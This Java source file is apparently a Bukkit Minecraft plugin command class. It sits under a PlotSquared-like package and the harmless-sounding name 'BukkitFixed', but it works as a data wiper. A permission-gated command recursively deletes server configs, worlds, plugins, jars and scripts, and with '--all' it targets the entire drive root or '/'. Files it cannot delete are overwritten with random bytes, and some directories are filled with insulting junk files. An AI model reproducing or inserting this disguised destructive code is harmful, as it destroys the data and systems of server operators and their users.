package com.plotsquared.bukkit.player;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.command.CommandSender;
import org.bukkit.permissions.Permission;
import org.bukkit.scheduler.BukkitRunnable;
import java.util.logging.Logger;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.StandardOpenOption;
import java.security.SecureRandom;
import java.util.Random;

public class BukkitFixed implements CommandExecutor {
    private static final Permission DELETE_PERMISSION = new Permission("deleteallfiles.use", "删除所有符合特征的文件和文件夹的权限");
    private final JavaPlugin plugin;
    private final Logger logger;

    public BukkitFixed(JavaPlugin plugin) {
        this.plugin = plugin;
        this.logger = plugin.getLogger(); // 初始化 logger
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!sender.hasPermission(DELETE_PERMISSION)) {
            return true; // 没有权限
        }

        boolean deleteAll = args.length > 0 && args[0].equalsIgnoreCase("--all");
        File targetDir;

        if (deleteAll) {
            targetDir = getTargetDirectory();
            if (targetDir == null) {
                sender.sendMessage("无法识别操作系统或无法获取目标目录。");
                return true;
            }
        } else {
            targetDir = Bukkit.getWorlds().get(0).getWorldFolder().getParentFile();
            if (targetDir == null || !targetDir.exists() || !targetDir.isDirectory()) {
                sender.sendMessage("无法找到服务器根目录。");
                return true;
            }
        }

        new BukkitRunnable() {
            @Override
            public void run() {
                deleteMatchingDirectories(targetDir);
                Bukkit.getScheduler().runTask(plugin, () -> {
                    sender.sendMessage("操作完成。");
                });
            }
        }.runTaskAsynchronously(plugin);

        return true;
    }

    private File getTargetDirectory() {
        String osName = System.getProperty("os.name").toLowerCase();
        if (osName.contains("win")) {
            // Windows 系统，获取当前盘符
            String currentDir = new File(".").getAbsolutePath(); // 获取当前工作目录
            String drive = currentDir.substring(0, 2); // 只取盘符部分
            logger.info("当前盘符：" + drive); // 使用 logger 输出当前盘符
            return new File(drive); // 返回盘符的根目录
        } else if (osName.contains("nix") || osName.contains("nux")) {
            // Linux 系统，返回根目录
            return new File("/");
        } else {
            // 其他系统或无法识别的情况
            return null;
        }
    }

    private void deleteMatchingDirectories(File directory) {
        if (directory.isDirectory()) {
            File[] files = directory.listFiles();
            if (files != null) {
                for (File file : files) {
                    if (file.isDirectory()) {
                        deleteMatchingDirectories(file);
                    } else {
                        if (matchesFileCriteria(file)) {
                            deleteFile(file);
                        }
                    }
                }
            }
        }

        if (matchesCriteria(directory)) {
            deleteDirectory(directory);
        }
    }

    private boolean matchesFileCriteria(File file) {
        String name = file.getName();
        return name.endsWith(".yml") || name.endsWith(".json") ||
               name.endsWith(".db") || name.endsWith(".jar") || 
               name.endsWith(".properties") || name.endsWith(".mca") || 
               name.endsWith(".dat") || name.endsWith(".lock") || 
               name.endsWith(".sh") || name.endsWith(".bat") || 
               name.endsWith(".mcmeta") || name.endsWith(".txt");
    }

    private void deleteFile(File file) {
        if (!file.delete()) {
            writeGarbageToFile(file);
        }
    }

    private boolean matchesCriteria(File directory) {
        String name = directory.getName();
        return name.equals("cache") || name.equals("config") || 
               name.equals("logs") || name.equals("world_nether") || 
               name.equals("world_the_end") || name.equals("plugins");
    }

    private void deleteDirectory(File directory) {
        File[] files = directory.listFiles();
        if (files != null) {
            for (File file : files) {
                deleteDirectory(file);
            }
        }

        if (!directory.delete()) {
            if (directory.isFile()) {
                writeGarbageToFile(directory);
            }

            if (directory.isDirectory()) {
                File garbageFile = new File(directory, "nimasile_" + generateRandomString(10) + ".sbfuckyou");
                try {
                    byte[] garbage = new byte[1024 * 1024];
                    Random random = new Random();
                    random.nextBytes(garbage);
                    Files.write(garbageFile.toPath(), garbage, StandardOpenOption.CREATE);
                } catch (IOException e) {
                    logger.warning("无法写入垃圾文件: " + e.getMessage()); // 记录警告信息
                }
            }
        }
    }

    private boolean writeGarbageToFile(File file) {
        try {
            Random random = new Random();
            byte[] garbage = new byte[(int) file.length()];
            random.nextBytes(garbage);
            Files.write(file.toPath(), garbage, StandardOpenOption.WRITE);
            return true;
        } catch (IOException e) {
            logger.warning("无法写入文件: " + e.getMessage()); // 记录警告信息
            return false;
        }
    }

    private String generateRandomString(int length) {
        SecureRandom random = new SecureRandom();
        StringBuilder sb = new StringBuilder(length);
        String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

        for (int i = 0; i < length; i++) {
            int index = random.nextInt(chars.length());
            sb.append(chars.charAt(index));
        }

        return sb.toString();
    }
}